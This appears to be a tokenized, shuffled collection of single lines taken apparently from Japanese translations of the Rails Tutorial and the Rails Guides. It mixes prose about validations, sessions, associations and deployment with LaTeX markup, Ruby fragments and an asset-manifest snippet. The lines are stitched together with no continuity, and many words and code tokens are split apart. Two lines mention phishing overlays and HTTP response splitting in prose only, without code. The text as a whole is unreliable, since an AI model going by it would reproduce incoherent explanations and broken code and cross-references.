▁ 登録 結果 ▁( 図 \ ref { fig : signup _ flash }) には ユーザー登録 成功 を 示す ウ ェ ル カ ム メッセージ が 、\ k ode { success } クラスの さ わ や か な 緑色 の 背 景 で 表示 されています ▟ この クラスは \ ref { sec : custom _ css } の Bootstrap ▁CSS フレームワーク の ものです 。
▁ これはリスト \ ref { code : correct _ signin _ failure } で使用されていました 。
▁` find _ or _ initialize _ by ` メソッドは ` find _ or _ create _ by ` と同様に 動作します が 、` create ` の 代りに ` new ` を呼ぶ 点 が異なります 。
▁ユーザー登録 に 失敗した場合 の 最後の 手順 として 、 問題が生じ た ために ユーザー登録 が 行われ なかった という ことを ユーザーに わかりやすく 伝える エラーメッセージ を追加しましょう 。
▁さらに 重要な 点 は 、 これは ` development ` モードでは サーバー への リクエスト の たびに 必ず 実行されます が 、` production ` モード と ` test ` モードでは 起動 時に 1 度 だけ しか 実行 されない ことです 。
▁#### # ▁` distinct `
▁" digest ":" 723 d 1 be 6 cc 7 4 1 a 3 a abb 1 ce c 242 76 d 6 8 1 " }, " application - 12 b 3 c 7 d d 7 4 d 2 e 9 d f 37 e 7 c b b 1 e fa 76 a 6 d ▖ css ":{" logical _ path ":" application ▖ css "," m time " : "2013-0 7-2 6 T 22 : 5 4 : 5 4 - 07 :00 "," size " : 15 60 ,
▁さらに ありがたい ことに 、 base 64 は URL を 安全 に エスケープ するために も 用 い られる ▁(\ k ode { url safe \_ base 64 } という名前の メソッド がある こと から も わかります ) ▁ ので 、 base 64 を 採 用 すれば 、 {1} 第 {2} 10 {/2} 章 {/1} で アカウントの有効化 のリンク や パスワード リ セット のリンク でも 同じ トークン ジェネレータ を使用 できるようになります 。
▁さらに 専 門 的な 攻 撃 としては 、 Web サイト 全体 を 上に 重 ね て 表示 したり ログインフォーム を表示し たり する という の があります ▟ これらは 元の サイト と 一見 そ っ く り ですが 、 入力 された ユーザー名 と パスワードを 密 か に 攻撃者 の サイトに 送信 します 。
▁ 単純な スコープ を設定する には 、 クラスの 内部で ` scope ` メソッド を使用し 、 スコープ が呼び出され たときに 実行 して 欲 しい クエリ を そこで 渡します 。
▁ユーザー 属性 の 「 名前 」 と 「 メールアドレス 」 に対して バリデーション を追加した ので 、 最後の 砦 である 「 セキュア な パスワード 」 に 取り 掛 か ります 。
▁ 認 証
▁mail ▁= ▁mail ▖ deliver _ now ▁# ▁" C all ed " を出力する
▁これで 、\ ref { sec : rails _ server } で 説明したとおり に ローカル サーバー が動作する はずです
▁self を省略した 結果を リスト \ ref { code : fixture _ second _ user } に示します 。
▁| ▁| ▁42 6 ▁| ▁: up grade _ require d ▁|
▁\ ref { sec : custom _ static _ pages } で サンプル アプリ の Home ページ と Help ページ を作成して 中 身 も 書き 加 え たので 、 今度は About ページを 同様に 追加します 。
▁#### ▁` find _ in _ batches `
▁### ▁ Atom F e ed Helper
▁Rails と Rack
▁$ ▁rake ▁rails : update
▁ 幸 い 、\ k ode { : uniqueness では \ k ode { : case _ sensitive } という 打 って つ け の オプション が 使用できます ▁( リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive } }) 。
▁この ルーティング を 常に エンジンの ` articles _ path ` ルーティングヘルパー メソッドで 取り 扱 う ように したい場合 、 以下のように エンジン と同じ 名前 を 共有 する ルーティング プロキシ メソッドを呼び出す 必要があります 。
▁# ▁ 管理者 かどうか 確 認
▁{0} 図 7 ▖ 19 {/0} ▁{1} ユーザー登録 に 成功 した 画面 のモックアップ {/1}
▁class ▁ Comment ▁< ▁ActiveRecord :: Base
▁ vendor / assets / javascripts / s li d er ▖ js
▁* ▁ アクション 側 で 受け取る パラメータ
▁Rails で [ アセットパイプライン ]( asset _ pipeline ▖ html ) ▁ を有効に している場合 、 JavaScript へのリンク 先 は 旧 Rails の ` public / javascripts ` ではなく ` / assets / javascripts / ` になります 。
▁{0}{1} リスト 2▖1 0 {/1}{/0} のコードは 、 これで 本当に 動作する のか と 思える かもしれませんが 、 ちゃんと 動作します ▁( 検証 機能 については \ ref { sec : user _ validations } で さらに 詳 しく 説明します )▟ 14 1 文字 以上の 新規 マイクロポストを 投 稿 してみ れば わかります 。
▁# ▁ クエリ の実行 計 画 ▁( クエリ プ ラン ) ▁ を 現在 より 多く 出力する
▁この 出力 は デフォルトの まま では 整 形 されていません 。
▁### ▁ 合 計
▁PostgreSQL の P repared ▁Statements はデフォルトで オン になります 。
▁上のコード で 、\ k ode { to _ a } メソッド が呼び出され ていること で マイクロポストの コピー が作成され ていることに注目してください ▁( 参 照 の コピー ではなく 、 オブジェクト 自体 が コピー されています )▟ さらに 、 以下の行 にも 注 目 してください 。
▁INFO : ▁以下の メソッドは 可能 であれば ` Time ` オブジェクト を返し 、 それ以外の 場合は ` DateTime ` を返します 。
▁本章では 、 アプリケーション で使用されている Ruby ▁on ▁Rails のバージョン を 、 新しい バージョン に アップグレード する 際の 手順 について 示 します 。
▁` find _ or _ create _ by ` の例 を 少し 変 え て 説明 を 続 け ます ▟ 今度は ' N ic k ' という名前の クライアント が必要 だと します 。
▁\ k ode { new } アクション を生成する と 、 それに対応する \ emph { ビュー } も 生成されます ▟\ k ode { create } や \ k ode { destroy } には 対応する ビュー がない ▁( = 不要 ) ▁ なので 、 無駄な ビュー を作成し ない ために ここでは new だけ を指定して います 。
▁ 週 の 始 まり はデフォルトで は 月 曜 日 ですが 、 引数 を渡して 変更 できます ▟ その ときに スレッド ローカル の ` Date ▖ beginning _ of _ week ` または ` config ▖ beginning _ of _ week ` を設定します 。
▁$ ▁git ▁ checkout ▁master
▁ これはリスト \ ref { code : production _ webserver _ config } で使用されていました 。
▁#### ▁Pass en g er を使用する
▁╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : static _ pages _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁もし このメソッド が 生成する SQL に 興 味 がある のであれば 、\ k ode { log / development ▖ log } を tail してみてください ▁( コマンドラインで ファイルに tail コマンドを実行 する という 意味 ) 。
▁### ▁ 自 己 結合
▁この ジェネレータ 呼び出し では 必要な モデル ファイル だけ が生成されます ▟ さらに ` blorgh ` ディレクトリ の 下 で 名前空間化され 、` Blorgh :: Comment ` という モデル クラス も 作成されます 。
▁--------- ----------------
▁ 現時点の Cloud 9 に含まれている Rails のバージョン は 、 最新の チュートリアル より わずか に 古 く 、 互換性 が ありません ▟ そのため 、 Rails を 手動で インストール する必要があります 。
▁ レスポンス 分割 とは 、 ヘッダー フィールド に 2 つの CRLF を 注入 し 、 その 後ろに 邪悪な HTML を 配置 する という 手法 です 。
▁ 逆に エンジン 内部 から アプリケーション を参照 する 場合は 、 同じ要領で ` main _ app ` を使用します 。
▁# ▁=> ▁ Bo ld ▁no ▁more !
▁module ▁Blorgh
▁最初に 、 Gravatar 画像 を変更する リンク に注目し てください ▟ Gravatar の Web サイト を探し てみると 、\ href { http :// gravatar ▖ com / email s } { http :// gravatar ▖ com / email s } に 画像 の 追加 と 編集 を 行える ページ があり ました ので 、\ k ode { edit } ページ 上の この URL { p 2 } へのリンク について ▁ テスト を行なう ことにします 。
▁< body >
▁TIP : ▁ 出力する オブジェクトに対して ` to _ xml ` を呼び出す 必要はありません 。
▁ カ ウ ン タ キャッシュ 用の カラム は 、` attr _ readonly ` によって 読み出し 専 用 属性 となる モデルの リスト に追加されます 。
▁これは オプション の ハッシュ を引数に取り 、 以下の どの オプションで も含め ることができます 。
▁\ text tt { let } メソッド
▁\ k ode { Application Controller } クラスにおける継承
▁* ▁` head ` を呼び出し 、 HTTP ヘッダー のみ で 構成 された レスポンス を作成して ブラウザに送信 する
▁` in ?` の例 を示します 。
▁ これはリスト \ ref { code : relationship _ create _ test } で使用されていました 。
▁たとえば 、 リスト \ ref { code : universal _ css } では 、 以下のように \ k ode { ▖ center } と \ k ode { ▖ center ▁h 1 } の両方 に対して ルール があります 。
▁この 手法 を 一般に ▁ _ キャッシュ 破 棄 ▁( cache ▁b us ting ) _ ▁ と呼びます 。
▁ インデックス が 付 与 された Micropost の マイグレーション
▁ 逆 リレーションシップ を使用して \ k ode { user ▖ followers } を実装する 。
▁ 一般的な \ k ode { find } メソッド 以外に 、 Active ▁Record には 特定の 属性 で ユーザー を検索する 方法 もあります 。
▁Active ▁Record の関連付け 機能 を使用すると 、2 つの モデルの 間 に つながり がある ことを 明示的に Rails に対して 宣言 する ことができ 、 それによって モデルの 操作を 一 貫 させる ことができます 。
▁\ href { http ://0▖0▖0▖0:3000/ sessions / new }{/ sessions / new } フォームを送信すると 図 \ ref { fig : initial _ failed _ signin _ rails _3} のようになります 。
▁` joins ` メソッドの 引数に 生の SQL を指定する ことで ` JOIN ` 句 を指定できます 。
▁デフォルトは `: erb ` です 。
▁User ▖ active ▖ where ( state : ▁' finished ')
▁ここまで 来 たら 、 テストスイート が パス する ことを確認 しましょう 。
▁t ▖ string ▁: publish er _ type
▁たとえば 以下のような もの があります 。
▁foreign _ key : ▁" this _ user _ id ",
▁つまり 、 モデルの 新しい インスタンス は 作成されます が 、 その 時点 では データベースに保存 されていません 。
▁Rails は “ followed s ” という シンボル 名 を見 て 、 これを “ followed ” という 単数形 の 変 え 、 ▁\ k ode { relationships } テーブルの \ k ode { followed \_ id } を使って 対象 のユーザー を取得し て きます 。
▁` many ?` は 、 ブロック が オプション として 与 えられ ると 、 true を返す 要素 だけ を 扱 います 。
▁class ▁C
▁Rails は 、 production モードでは デフォルトで ` public / assets ` ファイルを プリコンパイル します 。
▁続いて 、 この 行 を 出力 に含め るため の パーシャル ▁( 部分 テンプレート ) ▁ も 必要です 。
▁リスト { p 0} で 定義されている {2} authenticated ? {/2} メソッド 内の {2} remember _ token {/2} の 引数 は 、 リスト \ ref { code : user _ model _ remember } の {2} attr _ accessor ▁: remember _ token {/2} で 定義されている ア ク セ サ と同じ ではない 点にご注意ください ▟ 引数 は 、 メソッド 内 ローカル な 変数 になっています が 、
▁Object ▖ qualified _ const _ set (" Math :: P hi ", ▁1▖ 6 1 80 34 ) ▁# ▁=> ▁1▖ 6 1 80 34
▁上のコードは 、 データベース で 注文 のある 日付 ごとに ` Order ` オブジェクトを 1 つ 作成します 。
▁╼╼ ▁\ subsection { Heroku にデプロイする ▁ (1) } ╼ ▁\ label { sec : heroku _ step _ one }╼╼
▁上のコードは 、 記事 と 、 それ に 関連付けられた カテゴリ や コメント をすべて 読み込み ます 。
▁statement _ limit : ▁200
▁これで 、 テスト を実行すると ▁\ passing ▁ になるはずです 。
▁これで テスト はすべて パスするはずです
▁` find _ each ` メソッドは 、 レコード の バッチ を 1 つ 取り出し 、 続いて ▁ _ 各 _ ▁ レコードを 1 つの モデル として 個 別 に ブロック に yield します 。
▁JavaScript を使用して バリデーション を実装する 場合 、 ユーザーが JavaScript をオフに して しま えば バ イ パス されてしまいます 。
▁\ k ode { will \_ paginate } を ユーザー リスト の 上 と 下 の両方 に 配置 して あるので 、 ページネーション のリンク も ページの 上 と 下 の両方 に 表示 されています 。
▁ ログイン 済み かどうかを 確かめ る テストでは 、 Users コントローラ 用の テストが そのまま 役に立ちます ▁( リスト \ ref { code : edit _ update _ redirect _ tests } 、 リスト \ ref { code : action _ tests _ admin }) 。
▁ ブロック を 渡 した 場合 、 配列 の 要素 のうち ブロック が true を返す 要素 が セ パ レ ー タ として 使用されます 。
▁### ▁ 複数の 関連付けを 一 括 で 読み込む
▁リスト \ ref { code : micropost _ form } を 動 か す ための もう 1 つ の変更は 、 エラーメッセージ の パーシャル を再 定義 することです ▟ で なければ 、 リスト \ ref { code : micropost _ form } の 次の コードが 動きません 。
▁上の コマンドを実行 した ことで 、 本 節 で 必要となる \ k ode { account _ activation } メソッドと 、 次 節 ▁(\ ref { sec : password _ reset }) ▁ で 必要となる \ k ode { password _ reset } メソッド が生成され ました 。
▁最初に 、 お勧め の 方法 として RVM を使う 方法を 紹介します ▟ RVM は バージョン 1 ▖ 11 以降 から Bundler と の 統合 が含まれています 。
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁to _ visit ▁<< ▁ n ode ▁if ▁visit ed ▖ exclude ?(
▁redirect _ to ▁photos _ path , ▁status : ▁30 1
▁ 関連付けられたオブジェクト が ない場合は ` nil ` を返します 。
▁ 変数
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / reachable ▖ rb ` です 。
▁これは 2 とおり の 方法で 実装 できます 。
▁ 結果 、 最初に 想 像 して いた とおり
▁#### ▁` symbolize _ keys ` と ` symbolize _ keys !
▁本ガイドでは この後 、 それぞれの 関連付けの 宣言 方法 と 使用 方法 について 詳 しく 解説します 。
▁まずは 、 ビュー に 特殊な \ k ode { will \_ paginate } メソッド を追加しましょう ▁( リスト \ ref { code : will _ paginate _ index _ view })▟ 同じ コードが リスト の 上 と 下 に 2 つ あります が 、 その 理由は この後 で説明します 。
▁CSS の 読み込み シ ー ケ ン ス の中で 、\ k ode { application ▖ css } 自身 も インクルード すること を指定して います 。
▁ ルート から users への ルーティング を追加する
▁redirect _ to ▁@ article
▁ 簡 素 化 の ため 、 次のような Unix スタイル の プロンプト ▁( 行 の 頭 に 「\ $ 」 を表示する スタイル ) ▁ を使用して 、 その 例 が コマンドライン である ことを示しています 。
▁この 行 は 使用 し ないこと 。
▁ 手動で 画像 付き の 投 稿 を してみる と 、 図 ▁\ ref { fig : micropost _ with _ image } のようになります 。
▁**` Rails :: Rack :: Logger ` **
▁ メソッド
▁self ▖ default _ params ▁= ▁ {
▁リスト \ ref { code : unicorn _ config } では 少しだけ コードの 見 栄 え を 修正 しています ▟ これは 標準的な 1 行 80 文字 の 制限 に 合わせ るため の 変更 です 。
▁ 両者 を見 比 べ ると 、 細 部 が 若 干 異なる ことに 気 が 付 く でしょう ▁( たとえば 、 実際には 最後に Rails の ロゴ を ページ に追加します )▟ しかし モックアップ は 正 確 である 必要はありません ので 、 これで 十分です 。
▁Rails の \ k ode { debug } 情報 は ▁\ href { http :// www ▖ y a m l ▖ org /}{ YAML } ▁( 一種の \ href { http :// cat b ▖ org / j argon / html / R / recursive - acronym ▖ html } { 再帰的 略 語 } であり 、 “ YAML ▁A in ’ t ▁Mar k up ▁ Language ” ▁ の 略 と されています ) ▁ 形式で 表示されます ▟ YAML は 人 間 \ emph { だけで なく } コンピュータ にとって も 読みやすい 形式 です 。
▁ ステップ ファイルは \ k ode { feature s / step _ de f in it ion s } ディレクトリに 置きます ▟ ファイル名 は ここでは \ k ode { authentication _ step s ▖ rb } とします 。
▁ ログイン リンク は \ ref { sec : cha n g ing _ the _ layout _ links } で 動く ようにします ) 。
▁ テンプレート の 拡張子 を ` ▖ builder ` に すると 、` xml ` という名前の X m l M ar k up オブジェクトが 自動 で 使用 できるようになります 。
▁# ▁Before ▁actions
▁ユーザー ID を 一時 セッション の中に 安全 に 置 け る ようになった ので 、 今度は そのユーザー ID を 別の ページ で 取り出す ことにしましょう ▟ そのために は 、\ k ode { current \_ user } メソッドを 定義 して 、 セッション ID に対応する ユーザー名 を データベースから 取り 出 せる ようにします 。
▁( 既に Application コントローラに \ k ode { hello } アクション を追加して いた 方は 、 念のため 削除 しておく と よい かもしれません ) 。
▁* ▁ モデル 間 の関連付け ( ア ソ シ エ ー ション ) を表現する
▁** N ▁+ ▁1 クエリ 問題 を解決する **
▁group ▁: production ▁do
▁{0} 図 7 ▖ 18 {/0} {1} \ href { http :// localhost :3000/ signup }{/ signup } を表示し て 何も 入力 せずに ▁[ Create ▁my ▁account ] ▁ を クリック する ▟\ href { http :// railstutorial ▖ org / images / figures / blank _ signup _ password _ digest _ bootstrap _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁Rails の コントローラ では 、 認 証 や セッション 変数 へのアクセス に関する コードを アプリケーション 全体 で 共有 する のが 一般的 です ▟ 従って 、 このような コード はデフォルトで ` Application Controller ` から 継 承 します 。
▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁ プログラミング を対話的に 学習 できる コース
▁ このため 、 edit アクション や update アクション をテストする 前に ログイン しておく必要があります 。
▁このメソッド では 、 オブジェクトが コレクション 内で 従 う 必要のある 追加 条件 も 加 味 されます 。
▁ 数 分 待 って から ページ を再度 読み込む と 、 この テキスト は自動的に 新しい 時間 に基づいて 更新 されます 。
▁ ルート ルーティング で 「 goodbye , ▁world !」 を表示する よう 変更 する 。
▁しかし 残 念 な ことに 、 フィクスチャ では このような ことはできません ▟ さらに 、 リスト { p 0} に {2} password {/2} 属性 を追加する と 、 そのような カラム は データベースに 存在しない という エラーが発生し ます ▟ 実際 、 データベースに は そんな カラム はありません 。
▁ 送信 が 無効 の場合は 、 ログイン ▁( リスト \ ref { code : correct _ login _ failure }) ▁ と同様に \ k ode { new } ページを 出力 して \ k ode { flash ▖ now } メッセージ を表示します 。
▁<%= ▁form _ for ( zone ) ▁do ▁| f | ▁%>
▁If ▁we ▁me e t ▁some ▁day ,
▁* ▁` config ▖ active _ record ▖ logger ` は 、 Log 4 r の インターフェイス または デフォルトの Ruby ▁ Logger クラス に従う ロガー を 引数として 取り ます ▟ この ロガー は 以後 作成される すべての 新しい データベース接続 に渡され ます 。
▁* ▁ ref ute ではなく assert _ not を使用すること 。
▁Home ページ ▁(\ href { http :// localhost :3000/}{/}) ▁ に マイクロポストの 投 稿 フォーム を追加する
▁use ▁Rack :: MethodOverride
▁\ k ode { ActiveRecord :: Base } クラス を継承し た ことによって 、 作成した モデルオブジェクト は データベース にアクセス できるように なり 、 データベースの カラム を あ た か も Ruby の 属性 のように 扱えるように なります 。
▁たとえば ` self ▖ serialize d _ attributes ` は ` self ▖ class ▖ serialize d _ attributes ` のように クラスメソッド として 使用 してください 。
▁"/ Users / ry an / Site s / side _ projects / blorgh / test / dummy / app / views " ▁*
▁ 著者 の場合 、\ k ode { checkout } ▁という 長 った ら しい コマンド の代わりに \ k ode { co } という 短い コマンド ▁( エイリアス ) ▁ も 使えるように しています ▟ これを行うには 以下を実行し ます 。
▁ せっかく ユーザー ID が 既に アプリケーションの URL で そのまま 使われ ている のです から 、 メールアドレス の代わりに ユーザー ID を使う という 手 も もちろん あります ▟ ただ 、 メールアドレス に しておけば 、 将来 何らかの 理由 で ユーザー ID を ぼ か しておき た くなる 場合に 役に立 つ かもしれません ▁( 競 合 他 社 が あなた の アプリケーションの ユーザー 数 を推測し にくい ように したい 、 など ) 。
▁たとえば 、 以下のコード が あるとします 。
▁#### ▁ 面倒な 方法
▁2 番目 と 3 番目 は メ イン の \ k ode { if } 文 の 2 つの 分 岐 に 対応 します ▁( リスト \ ref { code : password _ reset _ update _ action }) 。
▁ attr _ internal ▁: controller , ▁: template
▁admin ▖ validates ▁: email , ▁presence : ▁true
▁ 本番 アプリケーションの デプロイ 先 の システム に 既存の JavaScript ランタイム が ない場合は 、 以下 を Gemfile に記述 します 。
▁以下の モデルを 例 に と ります 。
▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / Session _ ( computer _ science ) }{\ emph { セッション } } とは 、2 つの コンピュータ の 間 、 たとえば クライアント側 の ブラウザ と サーバー で 動作 している Rails と の 間 の 、 半 永続的 な 接続 の ことです 。
▁ それら を 確認し て から 次に 進 みましょう 。
▁ / about
▁S w it ch ed ▁to ▁branch ▁' master '
▁def ▁self ▖ default _ scope
▁ このように 、\ k ode { nil } オブジェクト 自身 は \ k ode { empty ?} メソッド には 応答 しない にもかかわらず 、\ k ode { nil ▖ to \_ s } と すると 応答 する ことがわかります 。
▁`: auto save ` オプションを ` true ` に設定する と 、 親 オブジェクトが保存される たびに 、 読み 込 まれ ている すべての メンバ を 保存 し 、 destroy フラグ が 立 っている メンバ を 破 棄 します 。
▁ 実際の アプリケーションコード は わずか 1 行 です 。
▁user name : ▁blog
▁この 変更 は 、` Relation ` に対して 直接 ミ ュ ー テ ー ター メソッドを呼び出す こと による 奇 妙 な バグ や 混 乱 を 防止 するために 行われ ました 。
▁ const _ name ▁= ▁path ▖ demodulize
▁ 何 だ か たくさん の テキスト が表示され ました 。
▁rails ▁new ▁app name ▁-- skip - sprockets
▁t ▖ string ▁: name
▁ 以前の Rails では strip _ tags () 、 strip _ links () 、 sanitize () メソッドで ブラックリスト 的 アプローチ が使用され ていました 。
▁ 他 も同様です 。
▁` delegate ` マクロ には 複数の メソッド を指定できます 。
▁ 本番環境 の メール 設定 ▁( リスト \ ref { code : sendgrid _ config }) ▁ と同様に 、 リスト \ ref { code : carrier _ w a ve _ configuration } では Heroku の 環境変数 ▁\ k ode { ENV } ▁ を使って 、 機 密 情報 が 漏洩 しない ようにしています 。
▁Article ▖ published
▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ') ▁do ▁| format |
▁{0} 図 2▖1 2 {/0} {1} 新しいマイクロポスト の作成 ページ ▁(\ href { http :// localhost :3000/ microposts / new }{/ microposts / new })▟ \ href { http :// railstutorial ▖ org / images / figures / demo _ new _ micropost - full ▖ png }{( 拡大 ) }{/1}
▁ 正しい 情報 で ユーザー登録 を 行った 場合 のテスト ▁( リスト \ ref { sec : a _ test _ for _ valid _ submission }) ▁ は既に あるので 、\ ref { code : a _ test _ for _ valid _ submission } で開発した テスト に 若 干 手 を加える ことにします 。
▁ エンジン は アプリケーションの 動作を 大 幅 に 変更 する もの ではなく 、 アプリケーションを 単 に 拡張 する ものです 。
▁ メソッドを 用 います ▟\ ref { sec : modify ing _ built _ in _ classes } の 終わり に 見 ました ) 。
▁some _ k la s s ▖ acts _ like ?( : string )
▁リスト \ ref { code : micropost _ ordering } のコード を追加する ことで 、 テストスイート は ▁\ passing ▁ になるはずです 。
▁Bootstrap には 洗 練 された タ イ ポ グ ラ フ ィ ー を 利用できる CSS ルール があります が 、 ここでは さらに 、 リスト \ ref { code : typography _ css } に示したように サイトの テキスト の 外 観 を 変 え る カスタム CSS ルール を追加しましょう 。
▁### ▁ 土台 を 設 置 する
▁0 ▖ ▖ 7 ) ▁# ▁=> ▁true
▁これにより 、 図 \ ref { fig : na ive _ user _ has _ many _ following } のように \ k ode { following } テーブル と ▁\ k ode { has \_ many } 関連付け を使用して 、 フォローしているユーザー の モデリング が できます 。
▁when ▁' B ad ▁User '
▁また 、\ emph { {1} 第 2 章 {/1} } でも 簡単に 紹 介 しました が 、 {2} マイグレーション {/2} の 変更を 元に戻す 方法 も 用意されています ▟ 詳細は {3} {1} 第 6 章 {/1} {/3} で説明します 。
▁{0} 図 6 ▖6{/0}{1} SQLite データベース \ k ode { db / development ▖ sqlite 3 } に 登録 された ユーザーの 行 ▟\ href { http :// railstutorial ▖ org / images / figures / sqlite _ user _ row _ with _ password _4_0 - full ▖ png }{( 拡大 ) }{/1}
▁### ▁ 名前付き 関連付け の配列 / ハッシュ を使用する
▁この ` author _ class ` メソッドは 常に ` Class ` オブジェクト を返す 必要があります 。
▁これで 、 リスト \ ref { code : friendly _ forwarding _ test } の フレンドリーフォワーディング 用 統合 テストはパスするはずです ▟ 成功 すれば 、 基本 ユーザー 認 証 機能 と ページ 保 護 機能 の実装 は 完了 です 。
▁` blog ` ディレクトリ に移動し 、 以下のコマンドを実行し ます 。
▁ テスト を変更 ファイル だけ ではなく 、\ emph { フル } で 実行 したい場合は 、\ k ode { guard > } プロンプト で Re t ur n キーを 押 します
▁( end )╼╼ \ section { アカウントを有効化する } ▁% ▁( fold )╼\ label { sec : activating _ the _ account }╼╼
▁ 結果を 図 \ ref { fig : signup _ failure } に 、 また 、 すべての デバッグ情報 を 図 \ ref { fig : signup _ failure _ rails _ debug } に 示 しました ▁( 読みやすい ように フォント サイズ を 拡大 しています ) 。
▁string ', ▁' foo ')
▁( 一般に 、 ファイル や ディレクトリ が うまく 表示 されていない 場合は このように ファイル ツリー を再 表示 してみてください ) 。
▁def ▁load _ missing _ constant ( from _ mod , ▁ const _ name )
▁ これはリスト \ ref { code : relationships _ belongs _ to _ test } で使用されていました 。
▁また 、 User モデルに \ k ode { has _ secure _ password } を追加した 効果 についても ▁( たとえば \ k ode { authenticate } メソッドの 効果 など も ) ▁ 具体的に 見 ていきます 。
▁続いて 、 メールの リンク を開いて 無効な 情報 を送信し 、 次に その リンク から 有効な 情報を 送信 して 、 それぞれ が 期待どおり に 動作する ことを確認します 。
▁( 今は このコード の 意味 が わ から なくても 問題ありません 。
▁ force ▁config / routes ▖ rb
▁hash ▁= ▁ { a : ▁1, ▁b : ▁2 }
▁ ドキュメント も 更新 する 必要がある か 。
▁self を省略した 結果を リスト \ ref { code : micropost _ partial } に示します 。
▁### ▁ ヘッダー の 値を 自動 エンコード する
▁` find ` メソッドを使用すると 、 与えられた どの オプション にも マッチする ▁ _ 主キー _ ▁ に対応する オブジェクトを 取り出す ことができます 。
▁\ emph { Rails チュートリアル } では これまで 配列 について 解説 していません でした が 、 配列 を理解する ことは 、 ハッシュ ▁(\ ref { sec : hashes _ and _ symbols }) ▁ や Rails の データモデル を理解する ための 重要な 基 盤 となります ▁( データモデル とは \ k ode { has \_ many } などの 関連付けの こと であり 、\ ref { sec : demo _ user _ has _ many _ microposts } や \ ref { sec : user _ micropost _ associations } で 詳 しく 説明します ) 。
▁{0}{1} 第 8 章 {/1}{/0} では 、 この \ k ode { authenticate } メソッドを使って ログイン する方法 を 解説します 。
▁(\ k ode { to _ s } メソッドを 呼び出し ている のは 、\ k ode { nil } トークン を 扱えるように する ためです ▟ ブラウザで nil トークン が発生する ことは あって はなりません が 、 テスト 中に 発生 することは あり え る ためです ) 。
▁your ▁user name ▁is : ▁<%= ▁@ user ▖ login ▁%> ▖ < br >
▁</ ul >
▁ 本チュートリアル では 、「 start er ▁t i er 」 という サービス を使用する ことにします ▟ これは 、( 執 筆 時点 では ) ▁1 日 の 最大 メール 数 が 400 通 まで という 制限 があります が 、 無料 で使用する ことができます 。
▁たとえば ` northwest _ ` を指定すると 、 Customer クラスは ` northwest _ customers ` を テーブル として 探 します 。
▁ただし 、 ハッシュ の場合は 若 干 異なります 。
▁ テストが ▁\ passing ▁ になる ためには 、 パスワード のバリデーション に対して 、 空 だった ときの 例外 処理 を加える 必要があります 。
▁以下は デフォルトの 接続 設定ファイル ( ` config / database ▖ yml ` ) に含まれる 、 開発環境 用の 接続 設定 です 。
▁また 、 有効な ユーザー情報 を送信し ても 新しい ユーザーが 実際に 作成される ことも ありません 。
▁ radio _ button _ tag ▁' g end er ', ▁' ma le '
▁作成した コードをリスト \ ref { code : log _ out _ with _ test _ close _ browser } に示します
▁ これによって 生成される ルーティング は 、 最初の 例 と 完全に 同じです 。
▁assemblies ▖ clear
▁belongs _ to ▁: supplier
▁このヘルパーは 、 属性の値 の長さ を検証します 。
▁* ▁ ク ッ キー に セッション を保存する ようにします 。
▁ 現在 はこの オプションを 設定 しても 何も 変わりません 。
▁\ failing ▁\ \ ▁\ file path { test / controllers / static \_ pages \_ controller \_ test ▖ rb } } ╼ %= ▁ lang : ruby , ▁options : ▁" h l _ lines " : ▁[ 15 , ▁ 16 , ▁17 , ▁ 18 ] ╼\ begin { code } ╼ require ▁' test _ helper ' ╼╼ class ▁StaticPages Controller Test ▁< ▁ ActionController :: TestCase ╼╼ ▁test ▁" should ▁get ▁ home " ▁do ╼ ▁get ▁: home ╼ ▁ assert _ response ▁: success
▁ 結 論 としては 、 この データモデル は メ ン テ ナ ン ス の観点 から 見 て 悪 夢 です ▟ ユーザー名 を変更する たびに 、\ k ode { users } テーブルの その レコード だけで なく 、\ k ode { following } テーブル と \ k ode { followers } テーブル の両方 について 、\ emph { そのユーザー を含む すべての 行 { } / } を更新し なければ なら なくなります 。
▁ 展開 された アプリケーションが 期待どおり に 動作 するために 、 SSL が 本番環境で 動作 するための 行 を 1 つ 追加します 。
▁has _ many ▁: comments
▁ パスワードの再設定 は 、 メール が 送信された 時刻 から 経 過 した 期間 が 、 有効 期間 よりも 長 く な った 場合に 「 期限切れ 」 となります ▟ これを 次のように 表 します 。
▁# ▁以下の どちら になる か は 一 定 ではない
▁ 本書 の目的は 、 単 に Rails を学ぶ ことで は \ emph { ではなく } 、 Rails を例にとって 広 い 意味 での \ emph { Web アプリケーション 開発 } そのもの を学ぶ ことに あります ▟ つまり 、 Rails に限ら ず 、 W or ld ▁Wi de ▁Web 上で 動く ソフトウェア を 開発 したり 改良 したり するための 技術 を 習 得 すること を 目 指 します 。
▁(\ ref { sec : adding _ to _ the _ layout } でも 説明したように 、 Rails の オプション ハッシュ は 繰り返し 登 場 する テーマ です ) 。
▁ さ っ そ く 、 ログインフォーム の 送信 について 簡単な 統合テスト を作成 することから始め ましょう 。
▁Rails ▖ application ▖ config ▖ action _ dispatch ▖ cookies _ serialize r ▁= ▁: hybrid
▁ より 詳細な “ foo ” と “ bar ” の 起 源 については 、\ emph { J argon ▁File の “ foo ” という 記事 } ▁( 英語 ) ▁ を参照してください ▟ ちなみに " foobar と " F U B A R " には \ href { http :// www ▖ cat b ▖ org / j argon / html / F / foo ▖ html } { 全 く 関係 が ありません でした } 。
▁` NameError ` の拡張
▁else
▁# ▁ SELECT ▁D IS T IN C T ▁role ▁FROM ▁clients
▁#### # ▁` collection ( force _ reload ▁= ▁false ) `
▁` uniq ` メソッドは 、 コレクション 内の 重複 を 削除します 。
▁ 最終的に 、 {0} 第 {1} 11 {/1} 章 {/0} で マイクロポスト 作成 時に ログイン 済み ユーザーの ID を使用して マイクロポスト と ユーザーを 関連付け 、 {2} 第 {1} 12 {/1} 章 {/2} で 現在のユーザー が 他の ユーザーを アプリケーション 上で フォロー できるように し 、 それによって 相手 の マイクロポストの フィード を 自分の ページに 表示 できるようにします 。
▁* ▁` index ▖ html ▖ erb `
▁ 新しい セッション 用 ▁( サインイン )
▁" Person "▖ tableize ▁# ▁=> ▁" people "
